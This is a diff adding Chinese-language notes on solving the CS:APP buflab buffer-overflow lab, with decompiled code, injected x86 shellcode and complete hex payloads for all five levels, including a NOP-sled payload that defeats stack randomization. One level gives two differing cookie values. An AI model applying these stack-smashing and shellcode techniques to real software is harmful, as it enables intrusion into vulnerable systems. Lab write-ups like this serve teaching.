@@ -162,3 +162,86 @@ struct node{
 ```
 输入的六个字母让链表重新排序，让链表的第一个域按从大到小排列即可
 答案：4 2 6 3 1 5
+
+# buflab
+## level0 smoke
+在没有开启nitro模式下，main函数会调用test函数
+```
+int test()
+{
+  int v0; // ST1C_4
+  signed int v1; // ebx
+
+  v0 = uniqueval();
+  v1 = getbuf();
+  if ( uniqueval() != v0 )
+    return puts("Sabotaged!: the stack has been corrupted");
+  if ( v1 != cookie )
+    return __printf_chk(1, "Dud: getbuf returned 0x%x\n", v1);
+  __printf_chk(1, "Boom!: getbuf returned 0x%x\n", v1);
+  return validate(3);
+}
+```
+test函数又调用了getbuf函数，该函数在读取输入的时候没有做限制，可以利用rop将其返回地址改为smoke的地址。
+```
+payload:aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa 18 8c 04 08
+```
+可以利用hex2raw工具将上述字符串以字节的形式输入给程序(详细的使用方法官网给的pdf文件中有)
+
+## level1 fizz
+fizz函数与smoke函数相比多了一个条件语句，如果要求函数的参数是cookie     
+根据栈帧结构，32位程序的参数在返回值上一个地址，所以相比level0 我们只需要在payload后面多加一个cookie(我假设我的uid是1，cookie位0x1c2a3245)即可（注意程序是小端存储的），另外由于将返回地址改掉以后，相当于重新调用了fizz这个函数，所以cookie的实际值应该和getbuf的返回地址中间间隔一个地址
+```
+payload:aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa 42 8c 04 08 aa aa aa aa 45 32 2a 1c
+```
+
+## level2 bang
+与level1类似，只不过判断条件由参数==cookie变为了global_value == cookie    
+首先想办法获取global_value的地址为0x804d100   
+``` 
+ mov $0x804d100,%eax
+ movl $0x1c2a2345,(%eax)
+ ret
+```
+利用上段汇编代码，改变global_value的值，将其存入buf   
+获取buf的开始地址为0x55683b38   
+> 做的过程中发现程序开启了NX，然后不会做了，参考了网络上的答案，发现他们都没有考虑这个问题，也不知道什么原因，继续按照原来的思路试试吧    
+
+将函数的返回地址溢出为buf的首地址，运行我们的恶意代码，然后再利用ret跳到bang的地址
+```
+payload:b8 00 d1 04 08 c7 00 45 32 2a 1c c3 aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa e8 3b 68 55 9d 8c 04 08
+```
+
+## level3 Dynamite
+题意解析: 改变getbuf函数的返回值，正常返回test，不破坏test的栈帧结构    
+思路：
+- 依然要向buf里面植入shellcode
+```
+ mov $0x1c2a3245,%eax # 改变返回值
+ push $0x8048bde # 正常的返回地址压入栈
+ ret
+```
+- 在写入payload的过程中不能破坏原有的栈帧结构，也就是说ebp不能被改变
+
+```
+payload:b8 45 32 2a 1c 68 be 8d 04 08 c3 aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa 40 3c 68 55 e8 3b 68 55
+```
+
+## level4 nitroglycerin
+题意解析: 类似level3，但是要连续执行五次，每一次执行栈的基址都会随机变化，但是变化幅度在+/- 240之内，每一次都要达成level3的效果   
+难点：    
+- 因为栈的地址是随机变化的，无法知道buf的具体地址在哪   
+  解决方法：可以知道栈地址的大概范围，将shellcode放到缓冲区的末尾部，前面用nop填充
+- 因为栈地址是随机变化的，在填充过程被破坏的ebp要如何修复？   
+  解决方法: 可以注意到test栈的ebp和getbuf栈的ebp地址是相对，始终相差一个0x30，当getbuf函数返回的时候esp总是等于getbuf的ebp+0x8，所以test的ebp值为esp+0x28
+```
+shellcode:
+ mov %esp,%ebp
+ add $0x28,%ebp
+ mov $0x1c2a3245,%eax
+ push $0x8048e3a
+ ret
+
+payload:
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 89 e5 83 c5 28 b8 45 32 2a 1c 68 3a 8e 04 08 c3 b8 45 32 2a 1c c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 38 3b 68 55
+```
